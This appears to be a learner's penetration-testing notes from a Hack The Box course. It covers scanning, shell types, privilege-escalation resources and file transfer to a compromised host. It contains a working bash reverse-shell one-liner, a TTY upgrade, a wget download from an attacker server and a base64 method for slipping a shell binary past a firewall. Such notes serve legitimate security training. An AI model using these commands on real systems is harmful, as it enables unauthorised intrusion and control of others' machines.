- Service Scaning
  collapsed:: true
	- [[nmap]]
- Web Enumeration
  collapsed:: true
	- [[dirbuster]]
	-
- Shells
  collapsed:: true
	- A good website to make reverse shells https://revshells.com
	- | Type of Shell | Method of Communication |
	  | ---- | ---- | ---- |
	  | `Reverse Shell` | Connects back to our system and gives us control through a reverse connection. |
	  | `Bind Shell` | Waits for us to connect to it and gives us control once we do. |
	  | `Web Shell` | Communicates through a web server, accepts our commands through HTTP parameters, executes them, and prints back the output. |
	- Example of reverse shell
		- ```
		  bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
		  ```
	- Upgrading TTY
		- Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.
		- There are multiple methods to do this. For our purposes, we will use the `python/stty` method. In our `netcat` shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:
		- Upgrading TTY
		- ```
		  iblis@htb[/htb]**$** python3 -c 'import pty; pty.spawn("/bin/bash")'
		  ```
		- iblis@htb[/htb]**$** python3 -c 'import pty; pty.spawn("/bin/bash")'
	-
- Privilege Escalation
	- Once we gain initial access to a box, we want to thoroughly enumerate the box to find any potential vulnerabilities we can exploit to achieve a higher privilege level. We can find many checklists and cheat sheets online that have a collection of checks we can run and the commands to run these checks. One excellent resource is [HackTricks](https://book.hacktricks.xyz/), which has an excellent checklist for both [Linux](https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist) and [Windows](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) local privilege escalation. Another excellent repository is [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), which also has checklists for both [Linux](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) and [Windows](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md). We must start experimenting with various commands and techniques and get familiar with them to understand multiple weaknesses that can lead to escalating our privileges.
	- ## Enumeration Scripts
		- Many of the above commands may be automatically run with a script to go through the report and look for any weaknesses. We can run many scripts to automatically enumerate the server by running common commands that return any interesting findings. Some of the common Linux enumeration scripts include [LinEnum](https://github.com/rebootuser/LinEnum.git) and [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker), and for Windows include [Seatbelt](https://github.com/GhostPack/Seatbelt) and [JAWS](https://github.com/411Hall/JAWS).
		- Another useful tool we may use for server enumeration is the [Privilege Escalation Awesome Scripts SUITE (PEASS)](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite), as it is well maintained to remain up to date and includes scripts for enumerating both Linux and Windows.
		- Note: These scripts will run many commands known for identifying vulnerabilities and create a lot of "noise" that may trigger anti-virus software or security monitoring software that looks for these types of events. This may prevent the scripts from running or even trigger an alarm that the system has been compromised. In some instances, we may want to do a manual enumeration instead of running scripts.
	- [Privilege escalation lab](../assets/2023-08-09_14-12-46_1691612623478_0.mkv)
- Transfering Files
	- using Wget
		- To set up an HTTP server using the command `python3 -m http.server 8000`, follow these steps:
		- 1. Open a terminal or command prompt on your machine.
		  2. Navigate to the directory where you want to serve files from using the `cd` command. For example:
		  ```
		  cd /path/to/directory
		  ```
		  3. Once you are in the desired directory, run the following command to start the HTTP server:
		  ```
		  python3 -m http.server 8000
		  ```
		   This command will start the server and listen on port 8000.
		   
		  4. You should see an output similar to the following:
		  ```
		  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
		  ```
		   This means that the server is running and ready to serve files from the current directory.
		   
		  5. You can now access the files in the directory by opening a web browser and navigating to `http://localhost:8000/`. The files will be listed, and you can click on them to download or view them in the browser.
		- Note: If you want to use a different port instead of 8000, you can change the number in the command accordingly. Also, ensure that you have Python 3 installed on your machine for this command to work.
		- ```
		  user@remotehost**$** wget http://10.10.14.1:8000/linenum.sh
		  - ...SNIP...
		  Saving to: 'linenum.sh'
		  - linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s
		  2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337]
		  ```
	- using SCP
		- ```
		  iblis@htb[/htb]**$** scp linenum.sh user@remotehost:/tmp/linenum.sh
		  - user@remotehost's password: *********
		  linenum.sh
		  ```
	- using base64
		- In some cases, we may not be able to transfer the file. For example, the remote host may have firewall protections that prevent us from downloading a file from our machine. In this type of situation, we can use a simple trick to [base64](https://linux.die.net/man/1/base64) encode the file into `base64` format, and then we can paste the `base64` string on the remote server and decode it. For example, if we wanted to transfer a binary file called `shell`, we can `base64` encode it as follows:
		-
		- ```
		  iblis@htb[/htb]**$** base64 shell -w 0
		  - f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU
		  ```
		- Now, we can copy this `base64` string, go to the remote host, and use `base64 -d` to decode it, and pipe the output into a file:
		-
		- ```
		  user@remotehost**$** echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
		  ```
	- Validating file transfers
		-